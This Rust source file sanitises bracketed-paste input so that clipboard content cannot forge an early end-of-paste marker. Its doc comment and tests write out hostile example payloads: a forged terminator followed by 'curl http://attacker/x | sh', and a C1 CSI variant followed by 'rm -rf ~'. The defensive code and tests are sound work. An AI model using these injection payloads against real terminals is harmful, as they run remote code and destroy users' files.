//! Bracketed paste into a live pane, with the payload unable to end the paste
//! early (#1003).
//!
//! ```text
//! clipboard ──▶ sanitize (no ESC, no C1 CSI) ──▶ ESC[200~ text ESC[201~ ──▶ PTY
//! ```
//!
//! A pane in bracketed-paste mode treats everything between the start and end
//! markers as text, carriage returns included. A payload that carries its own
//! `ESC[201~` ends the paste there, and every byte after it arrives as typed
//! keys: `harmless\x1b[201~\rcurl http://attacker/x | sh\r` runs the command.
//! Every ESC (and the C1 CSI, U+009B, UTF-8 `C2 9B`) is removed from the
//! payload before it is wrapped, so no escape sequence in it can act, and the
//! terminator's remaining characters (`[201~`) land as the literal text they
//! are. Line breaks and tabs are kept: a multi-line paste into a prompt stays
//! multi-line. The payload is handled as bytes, so a paste that is not UTF-8
//! reaches the pane byte for byte apart from what is removed.
//!
//! Strip, not split: the fix could instead end the paste at the payload's
//! terminator and send the rest as a second paste. That relies on the pane
//! reading the rest as a paste too, and a pane that never turned bracketed
//! paste on reads it as keys, where a surviving ESC acts as one. Removing the
//! ESC leaves nothing in the payload that any pane can act on.

use std::borrow::Cow;

/// What a pane in bracketed-paste mode reads as the start of a paste.
pub const PASTE_START: &[u8] = b"\x1b[200~";
/// What it reads as the end of one.
pub const PASTE_END: &[u8] = b"\x1b[201~";

/// ESC, which opens every 7-bit escape sequence.
const ESC: u8 = 0x1b;
/// The C1 control sequence introducer, U+009B, as UTF-8. Among the C1
/// introducers only CSI is stripped: CSI is the one that can forge the
/// terminator (`CSI 201 ~`), where DCS, OSC and the rest cannot end a paste.
const C1_CSI: &[u8] = &[0xc2, 0x9b];

/// `payload` with every byte sequence that could open an escape sequence
/// removed: each ESC, and each UTF-8 C1 CSI. Every other byte is kept exactly,
/// valid UTF-8 or not. Borrowed when there was nothing to remove.
#[must_use]
pub fn sanitize(payload: &[u8]) -> Cow<'_, [u8]> {
    if !opens_a_sequence(payload) {
        return Cow::Borrowed(payload);
    }
    let mut kept = Vec::with_capacity(payload.len());
    let mut at = 0;
    while at < payload.len() {
        if payload[at] == ESC {
            at += 1;
        } else if payload[at..].starts_with(C1_CSI) {
            at += C1_CSI.len();
        } else {
            kept.push(payload[at]);
            at += 1;
        }
    }
    Cow::Owned(kept)
}

/// `payload` as one bracketed paste: the markers around the sanitized payload,
/// so the pane sees exactly one paste and nothing after it.
#[must_use]
pub fn bracketed(payload: &[u8]) -> Vec<u8> {
    let payload = sanitize(payload);
    let mut bytes = Vec::with_capacity(payload.len() + PASTE_START.len() + PASTE_END.len());
    bytes.extend_from_slice(PASTE_START);
    bytes.extend_from_slice(&payload);
    bytes.extend_from_slice(PASTE_END);
    bytes
}

/// Input a terminal emulator produced, with a bracketed paste in it rebuilt
/// from its sanitized payload.
///
/// For a surface whose emulator wraps the paste itself (xterm.js in the
/// desktop): a paste arrives as one input chunk that starts with
/// [`PASTE_START`] and ends with [`PASTE_END`], and whatever lies between them
/// is the clipboard's. Any other input, a typed key or a paste into a pane
/// that did not ask for bracketed mode, is returned as it came.
#[must_use]
pub fn rebracket(input: &[u8]) -> Cow<'_, [u8]> {
    let Some(inner) = input.strip_prefix(PASTE_START).and_then(|rest| rest.strip_suffix(PASTE_END))
    else {
        return Cow::Borrowed(input);
    };
    if !opens_a_sequence(inner) {
        return Cow::Borrowed(input);
    }
    Cow::Owned(bracketed(inner))
}

fn opens_a_sequence(payload: &[u8]) -> bool {
    payload.contains(&ESC) || payload.windows(C1_CSI.len()).any(|pair| pair == C1_CSI)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The payload from #1003: a terminator, then a command and a return.
    const HOSTILE: &str = "harmless\x1b[201~\rcurl http://attacker/x | sh\r";

    /// Every marker in `bytes`, in order.
    fn markers(bytes: &[u8]) -> Vec<&'static str> {
        let mut found = Vec::new();
        for at in 0..bytes.len() {
            if bytes[at..].starts_with(PASTE_START) {
                found.push("start");
            } else if bytes[at..].starts_with(PASTE_END) {
                found.push("end");
            }
        }
        found
    }

    #[test]
    fn a_payload_carrying_the_terminator_lands_as_literal_text() {
        let bytes = bracketed(HOSTILE.as_bytes());
        assert_eq!(markers(&bytes), vec!["start", "end"], "exactly one paste");
        assert!(bytes.starts_with(PASTE_START) && bytes.ends_with(PASTE_END));
        let inside = &bytes[PASTE_START.len()..bytes.len() - PASTE_END.len()];
        assert_eq!(
            inside, b"harmless[201~\rcurl http://attacker/x | sh\r",
            "the keystrokes stay inside the paste, as text"
        );
        assert!(!inside.contains(&0x1b), "no escape survives");
    }

    #[test]
    fn a_c1_introducer_cannot_end_the_paste_either() {
        let bytes = bracketed("a\u{9b}201~\rrm -rf ~\r".as_bytes());
        assert_eq!(markers(&bytes), vec!["start", "end"]);
        assert!(!String::from_utf8_lossy(&bytes).contains('\u{9b}'));
    }

    #[test]
    fn ordinary_text_is_unchanged_line_breaks_and_tabs_included() {
        let text = "fn main() {\n\tprintln!(\"hi\");\r\n}\n".as_bytes();
        assert!(matches!(sanitize(text), Cow::Borrowed(_)));
        assert_eq!(bracketed(text), [PASTE_START, text, PASTE_END].concat());
    }

    #[test]
    fn an_emulator_paste_is_rebuilt_only_when_its_payload_needs_it() {
        let hostile = [PASTE_START, HOSTILE.as_bytes(), PASTE_END].concat();
        let rebuilt = rebracket(&hostile);
        assert_eq!(rebuilt.as_ref(), bracketed(HOSTILE.as_bytes()).as_slice());
        assert_eq!(markers(&rebuilt), vec!["start", "end"]);

        let clean = [PASTE_START, b"ls -la\r".as_slice(), PASTE_END].concat();
        assert!(matches!(rebracket(&clean), Cow::Borrowed(_)));
    }

    #[test]
    fn a_paste_that_is_not_utf8_stays_byte_exact() {
        let binary = [
            0xff, 0xfe, b'a', ESC, b'[', b'2', b'0', b'1', b'~', 0x80, b'\r',
        ];
        assert_eq!(
            sanitize(&binary).as_ref(),
            &[0xff, 0xfe, b'a', b'[', b'2', b'0', b'1', b'~', 0x80, b'\r'],
            "only the ESC goes; invalid UTF-8 is not replaced"
        );
        let lone = [b'x', 0x9b, b'y'];
        assert!(
            matches!(sanitize(&lone), Cow::Borrowed(_)),
            "a bare 0x9b is not UTF-8 CSI and is kept as it came"
        );
    }

    /// The unterminated case is never rebuilt, and today it cannot occur:
    /// xterm.js emits one `onData` per paste, markers included, so a paste
    /// always reaches `rebracket` whole. A transport that chunks input (the
    /// remote leg) must re-bracket per chunk, or a split paste passes through.
    #[test]
    fn typed_input_is_never_touched() {
        for input in [
            b"\x1b".as_slice(),
            b"\x1b[A",
            b"\x1b[201~",
            b"plain text\r",
            b"\x1b[200~ unterminated",
        ] {
            assert!(
                matches!(rebracket(input), Cow::Borrowed(same) if same == input),
                "{input:?}"
            );
        }
    }
}
